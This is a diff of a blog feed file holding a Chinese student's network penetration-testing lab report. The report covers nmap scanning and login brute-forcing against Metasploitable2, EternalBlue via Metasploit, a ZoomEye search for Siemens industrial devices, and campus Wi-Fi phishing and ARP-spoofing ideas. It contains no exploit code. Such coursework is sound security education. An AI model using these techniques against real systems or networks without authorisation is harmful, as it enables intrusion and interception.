+<h4 id="6-4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h4><p>WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。</p>
+<p>这是msf中对于ms17_010_eternalblue.rb的简介：</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195717671.png" alt="image-20231209195717671"></p>
+<p>永恒之蓝”利用了某些版本的微软服务器消息块（SMB）协议中的数个漏洞，而当中最严重的漏洞是允许远程电脑执行代码。大多利用复现多使用msfconsole进行。其利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过SMB漏洞上传WannaCry勒索病毒等恶意程序。</p>
+<h3 id="7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195750810.png" alt="image-20231209195750810"></p>
+<p>服务为CNIX HTTP Server 1.0版本过低，存在历史漏洞。</p>
+<h3 id="8-Winhex简单数据恢复与取证"><a href="#8-Winhex简单数据恢复与取证" class="headerlink" title="8.Winhex简单数据恢复与取证"></a>8.Winhex简单数据恢复与取证</h3><h4 id="8-1elephant-jpg不能打开了，利用WinHex修复，说明修复过程。"><a href="#8-1elephant-jpg不能打开了，利用WinHex修复，说明修复过程。" class="headerlink" title="8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。"></a>8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</h4><p> 使用winHex打开后发现，文件格式头出现错误，修改一下即可。（将前四个数字改为FFD8）</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195846138.png" alt="image-20231209195846138"></p>
+<h4 id="8-2笑脸背后的阴霾：图片smile有什么隐藏信息。"><a href="#8-2笑脸背后的阴霾：图片smile有什么隐藏信息。" class="headerlink" title="8.2笑脸背后的阴霾：图片smile有什么隐藏信息。"></a>8.2笑脸背后的阴霾：图片smile有什么隐藏信息。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195859266.png" alt="image-20231209195859266"></p>
+<h4 id="8-3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"><a href="#8-3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。" class="headerlink" title="8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"></a>8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</h4><p> 因为U盘中存在之前删除的文件，所以直接用DiskGenius软件进行恢复：</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195919729.png" alt="image-20231209195919729"></p>
+<h3 id="9-讨论学校热点GUET-WiFi的安全问题，以截图说明。"><a href="#9-讨论学校热点GUET-WiFi的安全问题，以截图说明。" class="headerlink" title="9.讨论学校热点GUET-WiFi的安全问题，以截图说明。"></a>9.讨论学校热点GUET-WiFi的安全问题，以截图说明。</h3><p>校园网存在端口隔离的安全保护。</p>
+<p>同一校园网下，设备之间可以进行IP访问通讯，因此存在校内钓鱼网站的危险。例如使用setoolkit进行模拟<a href="http://www.baidu.com网站,获取查询信息./">www.baidu.com网站,获取查询信息。</a></p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209200045641.png" alt="image-20231209200045641"></p>
+<p>2.可能存在Arp欺骗。可以使用arpspoof工具进行欺骗。</p>
+<ul>
+<li>详细见<a href="https://recyvan.github.io/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/">网络安全测试课程-作业-4</a></li>
+</ul>
+<p>3.校园网存在端口隔离的安全保护。</p>
+<p>校园网下                                                    </p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210172047736.png" alt="image-20231210172047736"></p>
+<p> 手机热点</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210172059959.png" alt="image-20231210172059959"></p>
+<h4 id="扫描另一台物理主机，查看端口开放情况"><a href="#扫描另一台物理主机，查看端口开放情况" class="headerlink" title="扫描另一台物理主机，查看端口开放情况"></a>扫描另一台物理主机，查看端口开放情况</h4><p>扫描另一台物理主机，查看端口开放情况。</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210154508721.png" alt="image-20231210154508721"></p>
+<p> 发现开放了80端口和135端口等多个端口，其中80端口为一道序列化题目，构造pop链后，可以通过include包含来获取权限。</p>
+<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210154520869.png" alt="image-20231210154520869"></p>
+<p>135端口：主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，RPC本身在处理通过TCP&#x2F;IP的消息交换部分有一个漏洞，该漏洞是由于错误地处理格式不正确的消息造成的。“冲击波”病毒，利用RPC漏洞可以攻击计算机。</p>
+<h2 id="三-实验小结"><a href="#三-实验小结" class="headerlink" title="三 实验小结"></a>三 实验小结</h2><p>1.道德黑客的理解：</p>
+<p>道德黑客，在我的认知中狭义地等同于白帽子。专门从事渗透测试及其他测试方法，确保信息系统安全。通过渗透测试来保证系统和设备安全。白帽黑客在网络用语中指站在黑客的立场攻击自己或被别人允许攻击的系统以进行安全漏洞排查的程序员。他们用的是黑客惯用的破坏攻击的方法，行的却是维护安全之事。</p>
+<p>2.实验总结</p>
+<ul>
+<li><p>google hacker语法的简单实用</p>
+</li>
+<li><p>Kali exiftools工具使用</p>
+</li>
+<li><p>Kali msfconsole 简单使用</p>
+</li>
+<li><p>网络空间引擎的简单使用</p>
+</li>
+<li><p>公用IP和私有IP的区别</p>
+</li>
+</ul>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
+      <categories>
+        <category>网络扫描与网络侦察</category>
+      </categories>
+      <tags>
+        <tag>网络渗透测试</tag>
       </tags>
   </entry>
   <entry>
@@ -473,99 +659,6 @@ DNS历史查询：（https://securitytrails.com/）
       </categories>
       <tags>
         <tag>信息搜集，渗透测试，网络安全，红蓝对抗</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>实验课一</title>
-    <url>/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/</url>
-    <content><![CDATA[<p><strong>网络渗透测试实验报告</strong> </p>
-<hr>
-<h2 id="一-实验目的和要求"><a href="#一-实验目的和要求" class="headerlink" title="一 实验目的和要求"></a>一 实验目的和要求</h2><p>理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</p>
-<h2 id="二-实验步骤"><a href="#二-实验步骤" class="headerlink" title="二 实验步骤"></a>二 实验步骤</h2><h3 id="1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。"><a href="#1-用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。" class="headerlink" title="1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。"></a>1.用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</h3><p>使用Google搜索：</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195152905.png" alt="image-20231209195152905"></p>
-<p>查找相关网页：</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195206871.png" alt="image-20231209195206871"></p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195211299.png" alt="image-20231209195211299"></p>
-<h3 id="2-照片中的女生在哪里旅行？截图搜索到的地址信息。"><a href="#2-照片中的女生在哪里旅行？截图搜索到的地址信息。" class="headerlink" title="2.照片中的女生在哪里旅行？截图搜索到的地址信息。"></a>2.照片中的女生在哪里旅行？截图搜索到的地址信息。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195232804.png" alt="image-20231209195232804"></p>
-<p>Google搜索：letrentehuit café brasserie发现：</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195249443.png" alt="image-20231209195249443"></p>
-<p>地址是：38 avenue de Suffren.75015 Paris.France。</p>
-<h3 id="3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。"><a href="#3-手机位置定位。通过LAC（Location-Area-Code，位置区域码）和CID（Cell-Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。" class="headerlink" title="3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。"></a>3.手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</h3><p>华为手机应该拨号*#* #2846579# *#*进入工程模式</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195332722.png" alt="image-20231209195332722"></p>
-<p>但是honor系列并不能在工程菜单找到相关信息。</p>
-<img src="11-17021235157051.png" style="zoom:50%;" />
-
-<p>在基站查询工具得到如下信息：</p>
-<img src="qq_pic_merged_1702124303982.jpg" alt="qq_pic_merged_1702124303982" style="zoom:50%;" />
-
-
-
-<h3 id="4-编码解码将Z29vZCBnb29kIHN0dWR5IQ-解码。截图。"><a href="#4-编码解码将Z29vZCBnb29kIHN0dWR5IQ-解码。截图。" class="headerlink" title="4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。"></a>4.编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195413526.png" alt="image-20231209195413526"></p>
-<h3 id="5-地址信息"><a href="#5-地址信息" class="headerlink" title="5.地址信息"></a>5.地址信息</h3><h4 id="5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"><a href="#5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。" class="headerlink" title="5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"></a>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195442914.png" alt="image-20231209195442914"></p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195447579.png" alt="image-20231209195447579"></p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195450786.png" alt="image-20231209195450786"></p>
-<p>该用户使用的apple品牌的的设备，访问的是广西桂林市教育网桂林电子科技大学网站。</p>
-<h4 id="5-2访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"><a href="#5-2访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。" class="headerlink" title="5.2访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。"></a>5.2访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</a></h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195521692.png" alt="image-20231209195521692"></p>
-<p>可以发现两个值并不一样，cmd下查询的IP是局域网内的私有IP，网站查询的为为公网IP，是当前网络连接的出口IP。但此处公网IP为US归属，是因为接入了VPN使用。</p>
-<p>这里涉及到的知识点是：可以通过NAT实现从私网IP到公网IP之间的联系。在报文离开私网进入Internet时，将源IP替换为公网地址，通常是出口设备的接口地址；一个对外的访问请求在到达目标以后，表现为由本组织出口设备发起，因此被请求的服务端可将响应由Internet发回出口网关；</p>
-<p>出口网关再将目的地址替换为私网的源主机地址，发回内部。</p>
-<h3 id="6-NMAP使用"><a href="#6-NMAP使用" class="headerlink" title="6.NMAP使用"></a>6.NMAP使用</h3><h4 id="6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"><a href="#6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。" class="headerlink" title="6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。"></a>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195601791.png" alt="image-20231209195601791"></p>
-<p>端口21的ftp（文件传输协议）服务，用于文件传输使用，是一种基于TCP的协议，采用客户&#x2F;服务器模式。通过FTP协议，用户可以在FTP服务器中进行文件的上传或下载等操作。（部分情况下可匿名登录</p>
-<p>端口22的ssh服务：用于远程登录管理计算机或服务器等，专为远程登陆会话和其他网络服务提供的安全性协议。利用SSH协议可以有效的防止远程管理过程中的信息泄漏问题。</p>
-<p>端口3306的mysql服务，mysql数据库用于管理网站等用户数据和信息。开放3306端口，可以远程登录并管理mysql服务。远程登录的话漏洞大多为弱口令，然后数据库写马。各个数据库端口开放不同。</p>
-<p>端口80的http服务，这里的端口开放表示靶机有基于apache&#x2F;nhinx等的网站开放。</p>
-<h4 id="6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。"></a>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195637125.png" alt="image-20231209195637125"></p>
-<p>OS类型为liunx系统，版本范围为；2.6.9-2.6.33</p>
-<h4 id="6-3利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码。"><a href="#6-3利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码。" class="headerlink" title="6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。"></a>6.3利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195657193.png" alt="image-20231209195657193"></p>
-<h4 id="6-4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h4><p>WannaCry是一种“蠕虫式”勒索病毒软件，由不法分子利用NSA泄露方程式工具包的危险漏洞“EternalBlue”（永恒之蓝）进行传播。该蠕虫感染计算机后会向计算机中植入敲诈者病毒，导致电脑大量文件被加密。</p>
-<p>这是msf中对于ms17_010_eternalblue.rb的简介：</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195717671.png" alt="image-20231209195717671"></p>
-<p>永恒之蓝”利用了某些版本的微软服务器消息块（SMB）协议中的数个漏洞，而当中最严重的漏洞是允许远程电脑执行代码。大多利用复现多使用msfconsole进行。其利用Windows系统的SMB漏洞获取系统的最高权限，该工具通过恶意代码扫描开放445端口的Windows系统。被扫描到的Windows系统，只要开机上线，不需要用户进行任何操作，即可通过SMB漏洞上传WannaCry勒索病毒等恶意程序。</p>
-<h3 id="7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7-利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7.利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h3><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195750810.png" alt="image-20231209195750810"></p>
-<p>服务为CNIX HTTP Server 1.0版本过低，存在历史漏洞。</p>
-<h3 id="8-Winhex简单数据恢复与取证"><a href="#8-Winhex简单数据恢复与取证" class="headerlink" title="8.Winhex简单数据恢复与取证"></a>8.Winhex简单数据恢复与取证</h3><h4 id="8-1elephant-jpg不能打开了，利用WinHex修复，说明修复过程。"><a href="#8-1elephant-jpg不能打开了，利用WinHex修复，说明修复过程。" class="headerlink" title="8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。"></a>8.1elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</h4><p> 使用winHex打开后发现，文件格式头出现错误，修改一下即可。（将前四个数字改为FFD8）</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195846138.png" alt="image-20231209195846138"></p>
-<h4 id="8-2笑脸背后的阴霾：图片smile有什么隐藏信息。"><a href="#8-2笑脸背后的阴霾：图片smile有什么隐藏信息。" class="headerlink" title="8.2笑脸背后的阴霾：图片smile有什么隐藏信息。"></a>8.2笑脸背后的阴霾：图片smile有什么隐藏信息。</h4><p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195859266.png" alt="image-20231209195859266"></p>
-<h4 id="8-3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"><a href="#8-3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。" class="headerlink" title="8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"></a>8.3尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</h4><p> 因为U盘中存在之前删除的文件，所以直接用DiskGenius软件进行恢复：</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209195919729.png" alt="image-20231209195919729"></p>
-<h3 id="9-讨论学校热点GUET-WiFi的安全问题，以截图说明。"><a href="#9-讨论学校热点GUET-WiFi的安全问题，以截图说明。" class="headerlink" title="9.讨论学校热点GUET-WiFi的安全问题，以截图说明。"></a>9.讨论学校热点GUET-WiFi的安全问题，以截图说明。</h3><p>校园网存在端口隔离的安全保护。</p>
-<p>同一校园网下，设备之间可以进行IP访问通讯，因此存在校内钓鱼网站的危险。例如使用setoolkit进行模拟<a href="http://www.baidu.com网站,获取查询信息./">www.baidu.com网站,获取查询信息。</a></p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231209200045641.png" alt="image-20231209200045641"></p>
-<p>2.可能存在Arp欺骗。可以使用arpspoof工具进行欺骗。</p>
-<ul>
-<li>详细见<a href="https://recyvan.github.io/2023/11/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E8%AF%BE%E7%A8%8B-%E4%BD%9C%E4%B8%9A-4/">网络安全测试课程-作业-4</a></li>
-</ul>
-<p>3.校园网存在端口隔离的安全保护。</p>
-<p>校园网下                                                    </p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210172047736.png" alt="image-20231210172047736"></p>
-<p> 手机热点</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210172059959.png" alt="image-20231210172059959"></p>
-<h4 id="扫描另一台物理主机，查看端口开放情况"><a href="#扫描另一台物理主机，查看端口开放情况" class="headerlink" title="扫描另一台物理主机，查看端口开放情况"></a>扫描另一台物理主机，查看端口开放情况</h4><p>扫描另一台物理主机，查看端口开放情况。</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210154508721.png" alt="image-20231210154508721"></p>
-<p> 发现开放了80端口和135端口等多个端口，其中80端口为一道序列化题目，构造pop链后，可以通过include包含来获取权限。</p>
-<p><img src="/2023/12/07/%E5%AE%9E%E9%AA%8C%E4%B8%80%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/image-20231210154520869.png" alt="image-20231210154520869"></p>
-<p>135端口：主要用于使用RPC（Remote Procedure Call，远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，RPC本身在处理通过TCP&#x2F;IP的消息交换部分有一个漏洞，该漏洞是由于错误地处理格式不正确的消息造成的。“冲击波”病毒，利用RPC漏洞可以攻击计算机。</p>
-<h2 id="三-实验小结"><a href="#三-实验小结" class="headerlink" title="三 实验小结"></a>三 实验小结</h2><p>1.道德黑客的理解：</p>
-<p>道德黑客，在我的认知中狭义地等同于白帽子。专门从事渗透测试及其他测试方法，确保信息系统安全。通过渗透测试来保证系统和设备安全。白帽黑客在网络用语中指站在黑客的立场攻击自己或被别人允许攻击的系统以进行安全漏洞排查的程序员。他们用的是黑客惯用的破坏攻击的方法，行的却是维护安全之事。</p>
-<p>2.实验总结</p>
-<ul>
-<li><p>google hacker语法的简单实用</p>
-</li>
-<li><p>Kali exiftools工具使用</p>
-</li>
-<li><p>Kali msfconsole 简单使用</p>
-</li>
-<li><p>网络空间引擎的简单使用</p>
-</li>
-<li><p>公用IP和私有IP的区别</p>
-</li>
-</ul>
-<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
-      <categories>
-        <category>网络扫描与网络侦察</category>
-      </categories>
-      <tags>
-        <tag>网络渗透测试</tag>
       </tags>
   </entry>
   <entry>
